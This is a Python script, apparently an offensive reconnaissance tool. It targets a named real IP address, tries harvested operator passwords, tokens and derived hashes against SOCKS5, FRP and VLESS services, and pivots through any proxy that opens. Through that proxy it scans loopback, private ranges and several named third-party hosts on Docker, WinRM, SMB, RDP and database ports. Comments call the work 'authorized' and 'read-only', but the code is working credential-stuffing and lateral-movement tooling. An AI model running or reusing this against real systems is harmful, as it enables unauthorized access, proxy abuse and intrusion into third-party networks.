#!/usr/bin/env python3
# Client-first protocol identification for 43.243.192.97 high ports (authorized task 15 asset 161788).
# Runs from a GitHub Actions runner (clean egress). READ-ONLY: no auth brute beyond a bounded
# known-credential list, no TCP/25 anywhere (all target port lists explicitly exclude 25).
import socket, ssl, json, os, sys, time, struct, threading, hashlib

TARGET = "43.243.192.97"
PORTS = [18643, 18644, 18645, 18646, 18647, 46485, 46486]
assert 25 not in PORTS

# Known operator credential material (from task-15 facts 1064676/1065890) for bounded reuse only.
FRP_TOKENS = [
    "", "123456", "xinyue888", "xinyue", "daimon", "daimon3332", "1poa", "1poa.org",
    "xiaogu", "xiaoguzuiniu", "al8YDTW!", "3E015oTw2ZDy", "mlmsspmkaltefhea",
    "allinssldocker", "zxcv123456789..", "00060f83f401721e99f97ec32242c774",
]
# extra derived tokens (md5/sha256 of the most repeated operator passwords)
for _p in ("xinyue888", "123456", "daimon", "1poa"):
    FRP_TOKENS.append(hashlib.md5(_p.encode()).hexdigest())
    FRP_TOKENS.append(hashlib.sha256(_p.encode()).hexdigest())
FRP_TOKENS = list(dict.fromkeys(FRP_TOKENS))

SOCKS5_CREDS = [
    ("5ab92cae", "d9672c94454e19f39bfa1fc6"),
    ("64c184a2", "12059f46114dbd99dbb9e45a"),
    ("6974f3f6", "00a234cbe1b9e5cb31fd712d"),
    ("ce5755e2", "6ee609f02061f29dee296314"),
    ("18bdaa71", "5a24d002a3d0c3297d898091"),
    ("a7c03c47", "29b68958976076d585fbd797"),
]
VLESS_UUIDS = [
    "84b44c68-f44e-499c-ae40-17cc82eacd28",
    "4c9ffdeb-645e-4158-8939-88013a03cbf2",
    "00000000-0000-0000-0000-000000000000",
]
SNIS = ["www.bing.com", "uniten.edu.my", "mirror.arizona.edu",
        "www.cs.nitech.ac.jp", "daimonna.com", "1poa.org"]

LOCK = threading.Lock()
OUT = []

def emit(rec):
    with LOCK:
        OUT.append(rec)
        try:
            print("R " + json.dumps(rec, ensure_ascii=False), flush=True)
        except Exception:
            pass

def hx(d, n=80):
    if d is None:
        return None
    return d[:n].hex()

def conn(port, timeout=5.0):
    s = socket.create_connection((TARGET, port), timeout=timeout)
    s.settimeout(timeout)
    return s

def rd(s, wait=1.5, maxn=4096):
    s.settimeout(wait)
    try:
        d = s.recv(maxn)
        if d == b"":
            return b"<CLOSED>"
        return d
    except socket.timeout:
        return b"<TIMEOUT>"
    except ConnectionResetError:
        return b"<RST>"
    except Exception as e:
        return ("<ERR:%s>" % type(e).__name__).encode()

def one(fn, port, name, wait=1.5):
    try:
        s = conn(port)
    except Exception as e:
        emit({"port": port, "probe": name, "connect_error": type(e).__name__})
        return
    try:
        fn(s)
    except Exception as e:
        emit({"port": port, "probe": name, "exc": repr(e)[:120]})
    finally:
        try:
            s.close()
        except Exception:
            pass

# ---------- probe implementations ----------
def p_serverfirst(port):
    def f(s):
        r = rd(s, 2.5)
        emit({"port": port, "probe": "server_first_2.5s", "resp_hex": hx(r), "resp_ascii": r[:32].decode("latin1", "replace")})
    one(f, port, "server_first")

def p_random(port):
    def f(s):
        s.sendall(os.urandom(16))
        r = rd(s, 1.5)
        emit({"port": port, "probe": "random16_reaction", "resp_hex": hx(r)})
    one(f, port, "random16")

def socks5_connect(s, host, dport, timeout=3.0):
    try:
        ip = socket.inet_aton(host)
    except OSError:
        return {"err": "bad_ip"}
    s.sendall(b"\x05\x01\x00\x01" + ip + struct.pack(">H", dport))
    r = rd(s, timeout, 64)
    if not r or r[:1] != b"\x05":
        return {"resp_hex": hx(r)}
    if len(r) < 2:
        return {"resp_hex": hx(r)}
    rep = r[1]
    out = {"rep": rep, "resp_hex": hx(r)}
    if rep == 0:
        out["ok"] = True
    return out

def p_socks5(port, state):
    def f(s):
        s.sendall(b"\x05\x02\x00\x02")
        r = rd(s, 1.5, 32)
        rec = {"port": port, "probe": "socks5_greeting", "resp_hex": hx(r)}
        emit(rec)
        if not r or r[:1] != b"\x05" or len(r) < 2:
            return
        method = r[1]
        if method == 0x00:
            res = socks5_connect(s, "1.1.1.1", 80)
            emit({"port": port, "probe": "socks5_connect_noauth", "result": res})
            if res.get("ok"):
                with LOCK:
                    state["socks5"].append({"port": port, "auth": "none"})
        elif method == 0x02:
            for (u, pw) in SOCKS5_CREDS:
                try:
                    s2 = conn(port)
                    s2.sendall(b"\x05\x02\x00\x02")
                    r2 = rd(s2, 1.2, 8)
                    if not (r2[:2] == b"\x05\x02"):
                        s2.close()
                        continue
                    ub, pb = u.encode(), pw.encode()
                    s2.sendall(b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb)
                    r3 = rd(s2, 1.2, 8)
                    ok = r3[:2] == b"\x01\x00"
                    emit({"port": port, "probe": "socks5_userpass", "user": u, "resp_hex": hx(r3), "ok": ok})
                    if ok:
                        res = socks5_connect(s2, "1.1.1.1", 80)
                        emit({"port": port, "probe": "socks5_connect_with_creds", "result": res})
                        if res.get("ok"):
                            with LOCK:
                                state["socks5"].append({"port": port, "auth": u + ":" + pw})
                        s2.close()
                        break
                    s2.close()
                except Exception as e:
                    emit({"port": port, "probe": "socks5_userpass", "user": u, "err": type(e).__name__})
        # strict single-method greeting in a fresh connection
        try:
            s3 = conn(port)
            s3.sendall(b"\x05\x01\x00")
            r3 = rd(s3, 1.2, 16)
            emit({"port": port, "probe": "socks5_greeting_noauth_only", "resp_hex": hx(r3)})
            s3.close()
        except Exception:
            pass
    one(f, port, "socks5")

def p_socks4(port):
    def f(s):
        s.sendall(b"\x04\x01\x00\x50\x01\x01\x01\x01\x00")
        r = rd(s, 1.5, 16)
        emit({"port": port, "probe": "socks4_connect", "resp_hex": hx(r)})
    one(f, port, "socks4")

def p_http(port):
    def f(s):
        s.sendall(b"GET http://1.1.1.1/ HTTP/1.1\r\nHost: 1.1.1.1\r\nProxy-Connection: close\r\nConnection: close\r\n\r\n")
        r = rd(s, 2.0, 512)
        emit({"port": port, "probe": "http_absolute_get", "resp_hex": hx(r, 160), "resp_head": r[:120].decode("latin1", "replace")})
    one(f, port, "http_abs")

    def g(s):
        s.sendall(b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n\r\n")
        r = rd(s, 2.0, 512)
        emit({"port": port, "probe": "http_connect", "resp_hex": hx(r, 160), "resp_head": r[:120].decode("latin1", "replace")})
    one(g, port, "http_connect")

def p_frp(port, state):
    def attempt(tok, mtype):
        try:
            s = conn(port, timeout=4.0)
        except Exception:
            return None
        body = json.dumps({
            "version": "0.52.3", "hostname": "ci-probe", "os": "linux", "arch": "amd64",
            "user": "", "privilege_key": tok, "timestamp": int(time.time()),
            "run_id": "probe", "pool_count": 1, "metas": None, "always_auth": False,
        }, separators=(",", ":")).encode()
        frame = bytes([mtype]) + struct.pack(">q", len(body)) + body
        try:
            s.sendall(frame)
            r = rd(s, 1.2, 512)
        except Exception as e:
            r = ("<ERR:%s>" % type(e).__name__).encode()
        finally:
            try:
                s.close()
            except Exception:
                pass
        return r

    hits = []
    # type 'o' (frp >= 0.9 login) with full token list, then legacy 'l' with a small subset
    plan = [(0x6f, FRP_TOKENS), (0x6c, FRP_TOKENS[:4])]
    for mtype, toks in plan:
        for tok in toks:
            r = attempt(tok, mtype)
            if r is None:
                continue
            interesting = (b"<TIMEOUT>" != r) and (b"<CLOSED>" != r) and (not r.startswith(b"<RST>"))
            if interesting:
                emit({"port": port, "probe": "frp_login", "mtype": hex(mtype), "token": tok,
                      "resp_hex": hx(r, 200), "resp_ascii": r[:160].decode("latin1", "replace")})
                if b"{" in r or b"run_id" in r:
                    hits.append({"token": tok, "mtype": hex(mtype), "resp": r[:200].decode("latin1", "replace")})
    emit({"port": port, "probe": "frp_summary", "attempts": sum(len(t) for _, t in plan), "hits": hits[:3]})
    if hits:
        with LOCK:
            state["frp"].append({"port": port, "hits": hits[:3]})

def p_tls_sni(port):
    for sni in SNIS:
        rec = {"port": port, "probe": "tls_sni", "sni": sni}
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = socket.create_connection((TARGET, port), timeout=4.0)
            ss = ctx.wrap_socket(raw, server_hostname=sni)
            cert = ss.getpeercert(binary_form=True)
            rec.update({"tls": "ok", "version": ss.version(), "cipher": ss.cipher()[0] if ss.cipher() else None,
                        "cert_len": len(cert) if cert else 0,
                        "cert_sha256": hashlib.sha256(cert).hexdigest()[:32] if cert else None})
            try:
                ss.close()
            except Exception:
                pass
        except Exception as e:
            rec.update({"tls": "fail", "err": type(e).__name__ + ":" + str(e)[:80]})
        emit(rec)

def p_vless(port, state):
    for uid in VLESS_UUIDS:
        rec = {"port": port, "probe": "vless_plain", "uuid": uid}
        try:
            u = bytes.fromhex(uid.replace("-", ""))
            s = conn(port, timeout=4.0)
            req = b"\x00" + u + b"\x00" + b"\x01" + struct.pack(">H", 80) + b"\x01" + socket.inet_aton("1.1.1.1")
            s.sendall(req)
            r = rd(s, 2.0, 64)
            rec["resp_hex"] = hx(r)
            if r and r[:1] == b"\x00":
                rec["vless_reply"] = True
                with LOCK:
                    state["vless"].append({"port": port, "uuid": uid})
            s.close()
        except Exception as e:
            rec["err"] = type(e).__name__
        emit(rec)

def p_h2(port):
    def f(s):
        s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        r = rd(s, 2.0, 128)
        emit({"port": port, "probe": "h2_preface", "resp_hex": hx(r)})
    one(f, port, "h2")

def p_rdp(port):
    def f(s):
        s.sendall(bytes.fromhex("030000130ee000000000000100080003000000"))
        r = rd(s, 2.0, 128)
        emit({"port": port, "probe": "rdp_x224", "resp_hex": hx(r)})
    one(f, port, "rdp")

def p_redis(port):
    def f(s):
        s.sendall(b"*1\r\n$4\r\nPING\r\n")
        r = rd(s, 1.5, 64)
        emit({"port": port, "probe": "redis_ping", "resp_hex": hx(r)})
    one(f, port, "redis")

def p_openvpn(port):
    def f(s):
        s.sendall(bytes.fromhex("380000000000000000"))
        r = rd(s, 2.0, 64)
        emit({"port": port, "probe": "openvpn_reset", "resp_hex": hx(r)})
    one(f, port, "openvpn")

def p_mtproto(port):
    def f(s):
        s.sendall(os.urandom(64))
        r = rd(s, 1.5, 16)
        emit({"port": port, "probe": "mtproto_random64", "resp_hex": hx(r)})
    one(f, port, "mtproto")

# ---------- pivot through an open socks5 proxy ----------
INTERNAL_TARGETS = [
    ("127.0.0.1", p) for p in (22, 80, 443, 2096, 2375, 3000, 3306, 5432, 5985, 6379, 8080, 8443, 8888, 30601, 9090)
] + [
    ("10.0.0.1", 80), ("192.168.1.1", 80), ("172.17.0.1", 2375),
    ("156.225.31.95", 5985), ("156.225.31.95", 5986), ("156.225.31.95", 445),
    ("156.225.31.95", 3389), ("156.225.31.95", 80), ("156.225.31.95", 443),
    ("155.94.236.170", 30601), ("155.94.236.170", 80), ("155.94.236.170", 443),
    ("158.178.147.50", 80), ("158.178.147.50", 443),
    ("162.141.137.231", 2096), ("1poa.org", 443),
]
assert all(p != 25 for _, p in INTERNAL_TARGETS)

def pivot_socks5(state):
    for ent in state["socks5"]:
        port = ent["port"]
        # re-do handshake (+auth if needed)
        try:
            s = conn(port, 6.0)
            s.sendall(b"\x05\x02\x00\x02")
            r = rd(s, 2.0, 8)
            if r[:2] == b"\x05\x02":
                u, pw = ent["auth"].split(":", 1)
                ub, pb = u.encode(), pw.encode()
                s.sendall(b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb)
                r = rd(s, 2.0, 8)
                if r[:2] != b"\x01\x00":
                    emit({"probe": "pivot_socks5_reauth_fail", "port": port})
                    s.close(); continue
        except Exception as e:
            emit({"probe": "pivot_socks5_reauth_exc", "port": port, "err": type(e).__name__})
            continue
        for (host, dport) in INTERNAL_TARGETS:
            try:
                s2 = conn(port, 6.0)
                s2.sendall(b"\x05\x02\x00\x02")
                r = rd(s2, 1.5, 8)
                if r[:2] == b"\x05\x02":
                    u, pw = ent["auth"].split(":", 1)
                    ub, pb = u.encode(), pw.encode()
                    s2.sendall(b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb)
                    rd(s2, 1.5, 8)
                try:
                    ip = socket.inet_aton(host)
                except OSError:
                    ip = None
                if ip:
                    s2.sendall(b"\x05\x01\x00\x01" + ip + struct.pack(">H", dport))
                else:
                    hb = host.encode()
                    s2.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + struct.pack(">H", dport))
                rr = rd(s2, 3.0, 64)
                rec = {"probe": "pivot_connect", "via": "socks5:%d" % port, "target": "%s:%d" % (host, dport),
                       "resp_hex": hx(rr)}
                if rr[:2] == b"\x05\x00":
                    rec["ok"] = True
                    # try to grab a banner
                    b = rd(s2, 2.0, 256)
                    rec["banner_hex"] = hx(b)
                    rec["banner_ascii"] = b[:80].decode("latin1", "replace")
                emit(rec)
                s2.close()
            except Exception as e:
                emit({"probe": "pivot_connect", "via": "socks5:%d" % port, "target": "%s:%d" % (host, dport),
                      "err": type(e).__name__})
        # local loopback HTTP probe for any 30601/80/443 that were open
        for hp in (30601, 80, 443, 8080, 8888):
            try:
                s3 = conn(port, 6.0)
                s3.sendall(b"\x05\x02\x00\x02")
                r = rd(s3, 1.5, 8)
                if r[:2] == b"\x05\x02":
                    u, pw = ent["auth"].split(":", 1)
                    ub, pb = u.encode(), pw.encode()
                    s3.sendall(b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb)
                    rd(s3, 1.5, 8)
                s3.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("127.0.0.1") + struct.pack(">H", hp))
                if rd(s3, 2.0, 32)[:2] != b"\x05\x00":
                    s3.close(); continue
                s3.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
                b = rd(s3, 3.0, 600)
                emit({"probe": "pivot_loopback_http", "via": "socks5:%d" % port, "lport": hp,
                      "resp_head": b[:300].decode("latin1", "replace")})
                s3.close()
            except Exception:
                pass

def pivot_vless(state):
    for ent in state["vless"]:
        port, uid = ent["port"], ent["uuid"]
        u = bytes.fromhex(uid.replace("-", ""))
        for (host, dport) in INTERNAL_TARGETS:
            try:
                s = conn(port, 6.0)
                try:
                    ip = socket.inet_aton(host)
                    addr = b"\x01" + ip
                except OSError:
                    hb = host.encode()
                    addr = b"\x03" + bytes([len(hb)]) + hb
                req = b"\x00" + u + b"\x00" + b"\x01" + struct.pack(">H", dport) + addr
                s.sendall(req)
                r = rd(s, 3.0, 64)
                rec = {"probe": "pivot_vless", "port": port, "target": "%s:%d" % (host, dport), "resp_hex": hx(r)}
                if r[:1] == b"\x00":
                    rec["ok"] = True
                emit(rec)
                s.close()
            except Exception as e:
                emit({"probe": "pivot_vless", "port": port, "target": "%s:%d" % (host, dport), "err": type(e).__name__})

def worker(port, state):
    t0 = time.time()
    try:
        p_serverfirst(port)
        p_random(port)
        p_socks5(port, state)
        p_socks4(port)
        p_http(port)
        p_frp(port, state)
        p_tls_sni(port)
        p_vless(port, state)
        p_h2(port)
        p_rdp(port)
        p_redis(port)
        p_openvpn(port)
        p_mtproto(port)
    except Exception as e:
        emit({"port": port, "probe": "worker_exc", "err": repr(e)[:200]})
    emit({"port": port, "probe": "done", "elapsed": round(time.time() - t0, 1)})

def main():
    emit({"probe": "env", "target": TARGET, "ports": PORTS, "utc": time.strftime("%FT%TZ", time.gmtime()),
          "runner_ip": None})
    state = {"socks5": [], "frp": [], "vless": []}
    ths = [threading.Thread(target=worker, args=(p, state), daemon=True) for p in PORTS]
    for t in ths:
        t.start()
    for t in ths:
        t.join(timeout=300)
    emit({"probe": "state", "state": state})
    if state["socks5"]:
        try:
            pivot_socks5(state)
        except Exception as e:
            emit({"probe": "pivot_socks5_exc", "err": repr(e)[:200]})
    if state["vless"]:
        try:
            pivot_vless(state)
        except Exception as e:
            emit({"probe": "pivot_vless_exc", "err": repr(e)[:200]})
    emit({"probe": "final", "records": len(OUT), "socks5": state["socks5"], "frp": state["frp"], "vless": state["vless"]})

if __name__ == "__main__":
    main()
